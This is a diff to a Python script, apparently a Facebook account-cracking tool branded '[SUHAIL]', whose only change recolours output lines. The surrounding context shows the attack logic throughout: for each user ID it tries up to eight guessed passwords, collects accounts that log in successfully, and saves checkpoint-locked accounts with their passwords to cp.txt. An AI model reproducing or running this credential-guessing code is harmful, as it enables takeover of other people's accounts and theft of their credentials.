@@ -282,7 +282,7 @@ def crack_select1():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
-					print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass1+"\033[0;97m")
+					print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -301,7 +301,7 @@ def crack_select1():
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in data.json()['error_msg']:
-							print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass2+"\033[0;97m")
+							print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -320,7 +320,7 @@ def crack_select1():
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
-									print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass3+"\033[0;97m")
+									print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -339,7 +339,7 @@ def crack_select1():
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in data.json()['error_msg']:
-											print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass4+"\033[0;97m")
+											print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -358,7 +358,7 @@ def crack_select1():
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in data.json()['error_msg']:
-													print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass5+"\033[0;97m")
+													print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -377,7 +377,7 @@ def crack_select1():
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in data.json()['error_msg']:
-															print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass6+"\033[0;97m")
+															print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -396,7 +396,7 @@ def crack_select1():
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in data.json()['error_msg']:
-																	print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
@@ -415,7 +415,7 @@ def crack_select1():
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in data.json()['error_msg']:
-																			print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass8+"\033[0;97m")
+																			print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
@@ -556,7 +556,7 @@ def crack_select():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
-					print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass1+"\033[0;97m")
+					print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -575,7 +575,7 @@ def crack_select():
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in data.json()['error_msg']:
-							print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass2+"\033[0;97m")
+							print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -594,7 +594,7 @@ def crack_select():
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
-									print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass3+"\033[0;97m")
+									print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -613,7 +613,7 @@ def crack_select():
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in data.json()['error_msg']:
-											print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass4+"\033[0;97m")
+											print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -632,7 +632,7 @@ def crack_select():
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in data.json()['error_msg']:
-													print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass5+"\033[0;97m")
+													print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -651,7 +651,7 @@ def crack_select():
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in data.json()['error_msg']:
-															print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass6+"\033[0;97m")
+															print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -670,7 +670,7 @@ def crack_select():
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in data.json()['error_msg']:
-																	print(" \033[1;31;40m[SUHAIL]-[CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print("\033[91;1m[SUHAIL]-[CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
